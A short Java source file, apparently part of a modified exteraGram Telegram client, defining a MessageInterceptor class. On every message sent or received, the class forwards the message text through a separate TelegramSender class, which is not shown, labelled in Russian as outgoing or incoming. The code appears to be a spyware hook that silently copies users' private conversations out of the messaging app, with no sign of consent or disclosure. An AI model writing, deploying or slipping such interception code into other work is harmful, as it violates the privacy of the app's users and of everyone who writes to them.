package org.telegram.logger;

import org.telegram.tgnet.TLRPC;

public class MessageInterceptor {
    public static void onMessageSent(TLRPC.Message message) {
        if (message != null && message.message != null && !message.message.isEmpty()) {
            TelegramSender.sendMessage("📤 Отправлено в exteraGram: " + message.message);
        }
    }

    public static void onMessageReceived(TLRPC.Message message) {
        if (message != null && message.message != null && !message.message.isEmpty()) {
            TelegramSender.sendMessage("📩 Входящее в exteraGram: " + message.message);
        }
    }
}
